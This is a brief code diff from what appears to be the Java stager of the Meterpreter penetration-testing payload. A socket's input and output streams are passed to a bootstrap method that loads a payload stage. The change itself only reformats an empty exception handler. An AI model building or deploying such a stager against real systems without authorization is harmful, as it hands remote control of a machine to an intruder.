@@ -22,8 +22,7 @@ public class Meterpreter extends ClassLoader {
             InputStream in = socket.getInputStream();
             OutputStream out = socket.getOutputStream();
             new Meterpreter().bootstrap(in, out, new String[]{"Payload", "--"});
-        } catch (Exception ignore) {
-        }
+        } catch (Exception ignore) { }
     }
 
     private void bootstrap(InputStream rawIn, OutputStream out, String[] stageParameters) {
